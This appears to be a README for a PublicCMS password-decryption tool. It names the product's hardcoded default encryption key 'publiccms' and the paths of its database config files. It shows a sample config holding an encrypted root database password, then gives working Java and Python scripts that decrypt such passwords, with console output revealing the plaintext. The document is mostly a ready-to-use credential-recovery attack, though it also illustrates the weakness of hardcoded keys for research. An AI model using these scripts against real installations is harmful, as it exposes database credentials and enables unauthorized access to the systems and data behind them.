# publiccms_decrypt

`publiccms-core-V4.0.202004.a.jar!/com/publiccms/common/constants/CommonConstants.class`

`publiccms-common-V4.0.202004.a.jar!/com/publiccms/common/tools/VerificationUtils.class`

**默认加密秘钥**

```
public static final String ENCRYPT_KEY = "publiccms";
```

## 数据库配置文件位置

`./publiccms/WEB-INF/classes/config/database-template.properties`

`./publiccms/WEB-INF/classes/config/database.properties`

`/webapps/ROOT/publiccms/data/database.properties`

```
jdbc.url=jdbc:mysql://192.168.240.21:3306/cms?characterEncoding=UTF-8&useSSL=false&useAffectedRows=true&serverTimezone=GMT%2B08
hikariCP.idleTimeout=25000
jdbc.driverClassName=com.mysql.cj.jdbc.Driver
jdbc.username=root
jdbc.encryptPassword= 9xgiKaPSBm9y76PsUC+0Ig==
```


## java DESede

```

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESedeKeySpec;

import java.util.Base64;
import java.util.Scanner;

import static com.publiccms.common.tools.VerificationUtils.sha1Encode;

public class Main {

    public static final String DEFAULT_CHARSET = "UTF-8";

    public static byte[] base64Decode(String input) {
        return Base64.getDecoder().decode(input);
    }

    public static String decrypt(byte[] input, String key) {
        try {
            byte[] sha1Key = sha1Encode(key).getBytes(DEFAULT_CHARSET);
            DESedeKeySpec dks = new DESedeKeySpec(sha1Key);
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DESede");
            SecretKey sKey = keyFactory.generateSecret(dks);
            Cipher cipher = Cipher.getInstance("DESede");
            cipher.init(2, sKey);
            byte[] ciphertext = cipher.doFinal(input);
            return new String(ciphertext, DEFAULT_CHARSET);
        } catch (Exception var8) {
            return "";
        }
    }

    public static void main(String[] args) {
        System.out.println("[+] Please input your PublicCMS password:");
        System.out.println("[+] Example= 9xgiKaPSBm9y76PsUC+0Ig==");
        Scanner sc = new Scanner(System.in);
        System.out.print("[+] Encrypt_Password= ");
        String password = sc.nextLine();
        byte[] var2 = base64Decode(password);
        String var3 = decrypt(var2, "publiccms");
        System.out.println("[+] Decrypt_Password= " + var3);

    }
}

```

java console 输出
```
[+] Please input your PublicCMS password:
[+] Example= 9xgiKaPSBm9y76PsUC+0Ig==
[+] Encrypt_Password= 9xgiKaPSBm9y76PsUC+0Ig==
[+] Decrypt_Password= p@ssw0rd
```

## 使用python解密 Desede

https://stackoverflow.com/questions/21982389/desede-in-java-and-3des-in-python

默认秘钥为 **`publiccms`** 经过sha1 加密为 `2435e960d9be985705455019cfd3bc84c39344db`

然后取**前24位** **`"2435e960d9be985705455019cfd3bc84c39344db"[0:24]`**

对应python脚本：

```
from pyDes import *
import hashlib
import base64

def get_sha1(res:str):
    import hashlib
    """
    使用sha1加密算法，返回str加密后的字符串
    """
    sha = hashlib.sha1(res.encode('utf-8'))
    encrypts = sha.hexdigest()
    return encrypts[0:24]

def publiccms_decrypt(data, key):
    # key1 = "2435e960d9be985705455019cfd3bc84c39344db"[0:24]
    keys = get_sha1(key)
    print("[+] Key= " + keys)
    data = base64.b64decode(data)
    k = triple_des(keys, ECB, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
    e = k.decrypt(data)
    return e.decode("utf-8")


data = "9xgiKaPSBm9y76PsUC+0Ig=="
key = "publiccms"
print("[+] EncryptData= " + data)
print("[+] PlainText= " + publiccms_decrypt(data, key))
```

## python 解密 demo
```
python3 publicms_decrypt.py

[+] EncryptData= 9xgiKaPSBm9y76PsUC+0Ig==
[+] Key= 2435e960d9be985705455019
[+] PlainText= p@ssw0rd
```
